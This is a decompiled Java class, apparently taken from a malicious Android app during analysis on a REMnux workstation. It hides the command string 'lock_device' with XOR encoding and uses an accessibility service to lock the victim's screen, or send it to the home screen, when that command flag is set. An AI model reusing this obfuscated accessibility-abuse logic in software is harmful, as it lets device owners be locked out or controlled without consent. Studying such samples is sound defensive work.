package com.zjxyxnvvp.nxvxchltf.util;

import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class d {
    private static short[] $ = {5457, 5458, 5470, 5462, 5474, 5465, 5464, 5451, 5460, 5470, 5464};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static boolean a(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        boolean g = com.zjxyxnvvp.nxvxchltf.d.e.f314a.g(uIDNwaidobaWIODb, $(0, 11, 5437));
        if (g) {
            uIDNwaidobaWIODb.performGlobalAction(Build.VERSION.SDK_INT >= 28 ? 8 : 2);
        }
        return g;
    }
}
